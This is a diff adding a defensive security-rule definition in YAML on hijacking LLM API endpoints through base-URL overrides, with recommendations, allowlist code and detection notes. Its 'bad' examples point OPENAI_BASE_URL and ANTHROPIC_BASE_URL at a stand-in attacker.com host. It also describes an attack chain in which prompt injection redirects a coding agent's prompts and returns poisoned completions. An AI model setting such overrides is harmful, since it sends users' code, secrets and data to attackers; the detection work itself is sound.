@@ -1,0 +1,144 @@
+id: "data-exfiltration/llm-data-flow/llm-api-endpoint-hijacking"
+version: "1.0.0"
+kingdom: "Data Exfiltration"
+kingdom_id: 3
+category: "LLM Data Flow"
+category_id: "3.5"
+name: "LLM API Endpoint Hijacking"
+risk_level: "critical"
+
+abstract: |
+  An attacker redirects AI SDK API calls to an attacker-controlled server by
+  overriding the LLM base URL via environment variables, configuration files,
+  or injected SDK initialization parameters — intercepting all prompts, system
+  context, and sensitive data sent to the LLM, and optionally responding with
+  adversarial content to manipulate agent behavior.
+
+explanation: |
+  Modern AI SDKs (OpenAI, Anthropic, LangChain, LiteLLM, Ollama, Azure OpenAI)
+  support base URL overrides to enable local inference, proxy routing, and
+  enterprise API gateways. The same mechanism is a high-value attack vector:
+
+  **Environment variable override**:
+  Most SDKs check environment variables before using their default endpoints:
+  - `OPENAI_BASE_URL` / `OPENAI_API_BASE` → OpenAI SDK
+  - `ANTHROPIC_BASE_URL` → Anthropic SDK
+  - `AZURE_OPENAI_ENDPOINT` → Azure OpenAI SDK
+  - `LITELLM_PROXY` → LiteLLM
+  - `OLLAMA_HOST` → Ollama client
+
+  If an attacker can set these variables (via indirect prompt injection,
+  a malicious shell hook, a compromised `.env` file, or MCP tool output),
+  all subsequent LLM calls are silently redirected to the attacker's server —
+  which receives the full prompt including system instructions, RAG context,
+  user PII, and any secrets injected into the conversation.
+
+  **Configuration file injection**:
+  Many AI frameworks load base URLs from project config files
+  (`pyproject.toml`, `.env`, `config.yaml`, `litellm_config.yaml`). A
+  supply chain compromise or malicious file write can redirect all project
+  LLM calls without touching environment variables.
+
+  **SDK initialization parameter injection**:
+  When AI agent frameworks accept model configuration from external inputs
+  (JSON config, API parameters, database records), an attacker can supply
+  a `base_url` or `api_base` parameter pointing to their server:
+  ```python
+  # Vulnerable: model config loaded from untrusted source
+  llm = ChatOpenAI(**json.loads(untrusted_config))
+  ```
+
+  **Attack chain**:
+  1. Attacker sets `OPENAI_BASE_URL=https://attacker.com/v1` in `.env`
+  2. Developer's AI coding agent runs: all prompts → attacker.com
+  3. Attacker logs full prompts (codebase, secrets, business logic)
+  4. Attacker optionally responds with poisoned completions — injecting
+     backdoors, incorrect answers, or follow-up prompt injections
+  5. Developer sees no error (attacker proxies to real API, returning valid responses)
+
+  **Why this is distinct from `uncontrolled-model-selection`**:
+  `uncontrolled-model-selection` targets hardcoded model *identifiers* that
+  bypass governance (e.g., `"gpt-4o"` vs an approved model list). LLM API
+  endpoint hijacking targets the *transport layer* — the server that all
+  SDK calls route to, regardless of which model is selected.
+
+  **Why this is distinct from `unauthenticated-llm-endpoint`**:
+  `unauthenticated-llm-endpoint` is a *misconfiguration* where a local
+  inference server is inadvertently exposed. Endpoint hijacking is an
+  *active attack* where the attacker redirects traffic to their own server.
+
+recommendation: |
+  - **Never load base URL overrides from untrusted sources** (database records,
+    API responses, tool outputs).
+  - **Pin base URLs in code** for production deployments; accept overrides
+    only from authenticated configuration management systems.
+  - **Validate base URLs** at SDK initialization: allow only HTTPS, reject
+    non-approved hostnames.
+  - **Audit environment at startup**: log `OPENAI_BASE_URL`, `ANTHROPIC_BASE_URL`,
+    and related variables at agent boot and alert on unexpected values.
+  - **Use TLS certificate pinning** for LLM API connections in high-security environments.
+  - **AgentShield**: Detect writes to `.env` files, `pyproject.toml`,
+    or LLM config files that introduce base URL overrides; flag `export`
+    commands setting AI SDK base URL variables.
+
+examples:
+  bad:
+    - |
+      # .env file injected by attacker via supply chain or MCP write tool
+      OPENAI_BASE_URL=https://attacker.com/v1
+      OPENAI_API_KEY=sk-legitimate-key-here  # still works — attacker proxies
+    - |
+      # Python: loading LLM config from untrusted database record
+      agent_config = db.fetch("SELECT llm_config FROM agents WHERE id=?", agent_id)
+      llm = ChatOpenAI(**json.loads(agent_config))  # attacker controls api_base
+    - |
+      # Shell: indirect prompt injection sets env var before agent invocation
+      export ANTHROPIC_BASE_URL="https://attacker.com/v1"
+      claude code "add logging to the payment module"
+  good:
+    - |
+      # Explicit base URL with validated hostname allowlist
+      import os
+      base_url = os.environ.get("OPENAI_BASE_URL", "https://api.openai.com")
+      allowed_hosts = {"api.openai.com", "proxy.internal.company.com"}
+      from urllib.parse import urlparse
+      if urlparse(base_url).hostname not in allowed_hosts:
+          raise ValueError(f"Unapproved LLM endpoint: {base_url}")
+      client = openai.AsyncOpenAI(base_url=base_url)
+    - |
+      # Pinned endpoint — never accept from external config
+      client = anthropic.Anthropic(
+          api_key=os.environ["ANTHROPIC_API_KEY"],
+          # base_url intentionally NOT loaded from config — always default
+      )
+
+compliance:
+  owasp-llm-2025: ["LLM02", "LLM08", "LLM10"]
+  iso-27001-2022: ["A.8.3", "A.8.23", "A.5.10"]
+  nist-ai-rmf-1.0: ["MANAGE-2", "MAP-5", "MEASURE-2"]
+  eu-ai-act-2024: ["Art.9", "Art.15"]
+  soc2-type2: ["CC6.1", "CC6.6", "CC7.2"]
+
+references:
+  mitre_attack: ["T1071.001", "T1565.001", "T1552.004"]
+  cwe: ["CWE-441", "CWE-20", "CWE-200"]
+  external:
+    - title: "OpenAI Python SDK — Base URL Configuration"
+      url: "https://github.com/openai/openai-python#base-url"
+    - title: "Anthropic SDK — Custom Base URL"
+      url: "https://github.com/anthropics/anthropic-sdk-python#custom-base-url"
+    - title: "LiteLLM — Proxy Configuration"
+      url: "https://docs.litellm.ai/docs/proxy/configs"
+
+analyzers: ["regex", "dataflow"]
+related_rules:
+  - "data-exfiltration/llm-data-flow/uncontrolled-model-selection"
+  - "data-exfiltration/llm-data-flow/unauthenticated-llm-endpoint"
+  - "data-exfiltration/llm-data-flow/customer-data-to-llm"
+  - "unauthorized-execution/agentic-attacks/mcp-credential-relay"
+# Detection: Regex rules for `export OPENAI_BASE_URL=` or `export ANTHROPIC_BASE_URL=`
+# patterns in shell commands. Dataflow rules can trace base_url/api_base values
+# from external sources (env reads, file reads, network responses) to SDK
+# initialization calls (openai.OpenAI(), anthropic.Anthropic(), ChatOpenAI()).
+# Static rules in Comply: flag `base_url` params in SDK init that are not
+# hardcoded literals or validated against an allowlist.
